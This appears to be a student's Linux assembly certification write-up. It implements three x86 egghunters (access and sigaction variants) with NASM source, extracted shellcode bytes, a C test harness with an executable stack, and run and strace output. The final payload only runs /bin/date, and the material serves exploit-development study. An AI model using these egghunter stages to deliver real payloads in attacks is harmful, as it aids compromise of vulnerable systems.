# Note

This MD file has been created for the SecurityTube Linux Assembly Expert certification (https://www.pentesteracademy.com/course?id=3). Student ID: 1483.

# Egghunter

The first step is to study about egghunter. A very nice document with optimised examples is available: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf 

In this assignment, three examples will be implemented following the same way.

## Final payload

The final payload is an execve shellcode calling /bin/date program. The idea will be to put the final shellcode between many "a" in order to increase the search. It will look like that: *\x61\x61\x61...EGG...SHELLCODE...\x61\x61\x61*.

### Execve Date

Based on examples from the course, an execve shellcode calling date can be easily done:

```ASM
global _start

section .text

_start:
 xor eax, eax
 push eax

 push 0x65746164 ;date
 push 0x2f6e6962 ;bin/
 push 0x2f2f2f2f ;////

 mov ebx, esp

 push eax
 mov edx, esp

 push ebx
 mov ecx, esp

 mov al, 11
 int 0x80
```
### shellcode.c

```
$ echo $(python3 -c 'a=("\\x%0.2x" % 97);print(a*2500)')$(echo \\x90\\x50\\x90\\x50\\x90\\x50\\x90\\x50)$(bash ../get-shellcode.sh execve-date |cut -d\" -f 2)$(python3 -c 'a=("\\x%0.2x" % 97);print(a*2500)')
```

The test program will be base on shellcode.c:

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = "INSERT EGGHUTER";
main()
{
 unsigned char memory_space[] = "\x61\x61\x61...\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc0\x50\x68\x64\x61\x74\x65\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80...\x61\x61\x61";
 printf("Shellcode Length:  %d\n", strlen(code));

 int (*ret)() = (int(*)())code;
 ret();
}
```
## access(2)

The shellcode is converted for nasm:
```ASM
global _start

section .text

_start:
 mov ebx, 0x50905090 ;the egg
 xor ecx, ecx ;ecx to 0
 mul ecx ;eax and edx to 0

 page_alignment:
  or dx,0xfff
 next_page:
  inc edx

 pusha ;save registers
 lea ebx, [edx+0x4]
 mov al, 0x21 ;#define __NR_access 33
 int 0x80 ;syscall
 cmp al, 0xf2 ;EFAULT return value
 popa ;backup registers
 jz page_alignment
 cmp [edx],ebx ;check for egg 1/2
 jnz next_page
 cmp [edx+0x4],ebx ;check for egg 2/2
 jnz next_page
 jmp edx ;call final shellcode
```

It is extracted in order to be inserted into the *shellcode.c* file (as the file contents many a, it will not be displayed here.
```
$ bash ../get-shellcode.sh access2
"\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2"
```

After compilation, our final shellcode is immidiatly executed:

```
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$ date && ./shellcode 
lundi 24 février 2020, 15:02:23 (UTC+0100)
Shellcode Length:  39
Mon Feb 24 15:02:23 CET 2020
```

## access(2) revisited

The shellcode is converted for nasm:
```ASM
global _start

section .text

_start:
 xor edx,edx ;edx to 0
page_alignment:
 or dx,0xfff
next_page:
 inc edx
 lea ebx,[edx+0x4]
 push byte +0x21 ;#define __NR_access 33
 pop eax
 int 0x80 ;syscall
 cmp al,0xf2 ;EFAULT return value
 jz page_alignment
 mov eax,0x50905090 ;the egg
 mov edi,edx
 scasd ;check for egg 1/2
 jnz next_page
 scasd ;check for egg 2/2
 jnz next_page
 jmp edi ;call final shellcode
```

It is extracted in order to be inserted into the *shellcode.c* file (as the file contents many a, it will not be displayed here.
```
$ bash ../get-shellcode.sh access2revisited
"\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7"
```

After compilation, our final shellcode is immidiatly executed:

```
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$ date && ./shellcode 
lundi 24 février 2020, 21:00:39 (UTC+0100)
Shellcode Length:  35
Mon Feb 24 21:00:39 CET 2020
```

## sigaction(2)

The shellcode is converted for nasm:
```ASM
global _start

section .text

_start:
 or cx,0xfff
 next_page:
  inc ecx
 push byte +0x43 ; #define __NR_sigaction 67
 pop eax
 int 0x80 ;syscall
 cmp al,0xf2 ;EFAULT return value
 jz _start
 mov eax,0x50905090 ;the egg
 mov edi,ecx
 scasd ;check for egg 1/2
 jnz next_page
 scasd ;check for egg 2/2
 jnz next_page
 jmp edi ;call final shellcode
```

It is extracted in order to be inserted into the *shellcode.c* file (as the file contents many a, it will not be displayed here.
```
$ bash ../get-shellcode.sh sigaction
"\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x90\x50\x90\x50\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7"
```

After compilation, our final shellcode is immidiatly executed:

```
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$ date && ./shellcode 
lundi 24 février 2020, 21:04:42 (UTC+0100)
Shellcode Length:  30
Mon Feb 24 21:04:42 CET 2020
```

## Final check

In order to be sure that this is the egghunter which is executed, a simple //strace// can be used. A sample of the output of the last egghunter is put below:

```
sigaction(SIG_0, {...}, NULL, 0x43)     = -1 EFAULT (Bad address)
sigaction(SIG_0, {...}, NULL, 0x43)     = -1 EFAULT (Bad address)
sigaction(SIG_0, {...}, NULL, 0x43)     = -1 EFAULT (Bad address)
sigaction(SIG_0, {...}, NULL, 0x43)     = -1 EFAULT (Bad address)
sigaction(SIG_0, {...}, NULL, 0x43)     = -1 EFAULT (Bad address)
sigaction(SIG_0, {...}, NULL, 0x43)     = -1 EFAULT (Bad address)
sigaction(SIG_0, {...}, NULL, 0x43)     = -1 EFAULT (Bad address)
sigaction(SIG_0, {...}, NULL, 0x43)     = -1 EFAULT (Bad address)
sigaction(SIG_0, {...}, NULL, 0x43)     = -1 EFAULT (Bad address)
sigaction(SIG_0, {...}, NULL, 0x43)     = -1 EFAULT (Bad address)
sigaction(SIG_0, {...}, NULL, 0x43)     = -1 EFAULT (Bad address)
sigaction(SIG_0, {...}, NULL, 0x43)     = -1 EFAULT (Bad address)
sigaction(SIG_0, {...}, NULL, 0x43)     = -1 EFAULT (Bad address)
sigaction(SIG_0, {...}, NULL, 0x43)     = -1 EFAULT (Bad address)
sigaction(SIG_0, {...}, NULL, 0x43)     = -1 EFAULT (Bad address)
sigaction(SIG_0, {...}, NULL, 0x43)     = -1 EFAULT (Bad address)
```
